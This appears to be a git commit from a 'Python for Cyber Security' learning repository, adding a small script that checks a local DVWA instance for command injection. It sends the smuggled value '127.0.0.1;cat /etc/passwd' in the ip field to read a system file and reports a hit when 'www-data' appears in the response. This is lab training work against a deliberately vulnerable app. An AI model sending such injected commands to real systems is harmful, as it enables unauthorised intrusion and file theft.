a6ad8ab868fbae03e523017cc478d7b4e5f9876a
suleyagmurkara <suleyagmurkara@gmail.com>
2021-09-08 19:32:31 +0300

    Siber Güvenlik İçin Python

---
+++ Moduller/CommandInjection/command_injection.py
@@ -0,0 +1,9 @@
+import requests
+
+header = {"Cookie": "security=low; PHPSESSID=t6fsab21kllkntcbtjf4mvhohp"}
+url = "http://127.0.0.1/dvwa/vulnerabilities/exec/"
+data = {"ip": "127.0.0.1;cat /etc/passwd", "Submit": "Submit"}
+sonuc = requests.post(url=url, data=data, headers=header)
+
+if "www-data" in str(sonuc.content):
+    print("Command injection vardır.")
